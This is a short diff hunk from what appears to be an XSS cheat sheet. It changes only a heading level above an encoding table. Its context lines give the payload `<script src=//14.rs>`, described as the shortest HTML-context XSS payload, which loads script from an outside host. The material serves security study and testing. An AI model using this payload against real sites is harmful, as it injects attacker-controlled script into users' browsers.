@@ -10,7 +10,7 @@
 * Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use `<script src=//14.rs>` instead of `<script src="//14.rs">`
 * The shortest HTML context XSS payload is `<script src=//14.rs>` \(19 chars\)
 
-#### Awesome Encoding
+### Awesome Encoding
 
 | HTML | Char | Numeric | Description | Hex | CSS \(ISO\) | JS \(Octal\) | URL |
 | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
